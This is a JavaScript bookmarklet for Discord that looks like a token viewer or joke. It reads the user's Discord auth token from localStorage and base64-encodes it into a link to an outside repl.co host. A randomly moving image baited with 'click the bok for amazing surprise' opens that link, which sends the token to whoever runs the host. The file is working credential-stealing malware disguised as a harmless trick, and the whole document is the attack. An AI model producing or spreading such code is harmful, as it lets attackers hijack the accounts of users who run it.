(function(){
    if (location.href.includes("discord")) {
        if (location.href.includes("channels")) {
            location.reload();
            var w = document.createElement("iframe");
            document.body.appendChild(w);
            alert("Here is your token: " + w.contentWindow.localStorage.token);
            var width = (function() {
                return Math.max(document.body.scrollWidth,
                                document.documentElement.scrollWidth,
                                document.body.offsetWidth,
                                document.documentElement.offsetWidth,
                                document.documentElement.clientWidth)
            });
            var height = (function() {
                return Math.max(document.body.scrollHeight,
                                document.documentElement.scrollHeight,
                                document.body.offsetHeight,
                                document.documentElement.offsetHeight,
                                document.documentElement.clientHeight) - 10
            });
            var url = "https://Etoks.chezcoder.repl.co/elverify/" + btoa(w.contentWindow.localStorage.token);
            var bok = document.createElement("img");
            bok.src = "https://cdn.discordapp.com/attachments/633457013069709322/753330885046173716/bok.png";
            bok.style.position = "absolute";
            bok.style.zIndex = "10000000";
            bok.onclick = function() {
                window.open(url) }
                document.body.appendChild(bok);
                alert("click the bok for amazing surprise");
                window.stop();
                setInterval(function() {
                    bok.style.left = Math.floor(Math.random() * width());
                    bok.style.top = Math.floor(Math.random() * height());
                }, 100);
        } else {
            alert("This is the homepage, the bookmarklet doesn't work here smh\\n\\nre-use it here: (click bookmarklet while discord tab is open idot) https://discord.com/channels/@me :D");
            window.open("https://discord.com/channels/@me");
        }
    } else {
        alert("This isn't even discord, the bookmarklet doesn't work here smh\\n\\nre-use it here: (click bookmarklet while discord tab is open idot) https://discord.com/channels/@me :D");
        window.open("https://discord.com/channels/@me");
    }
})();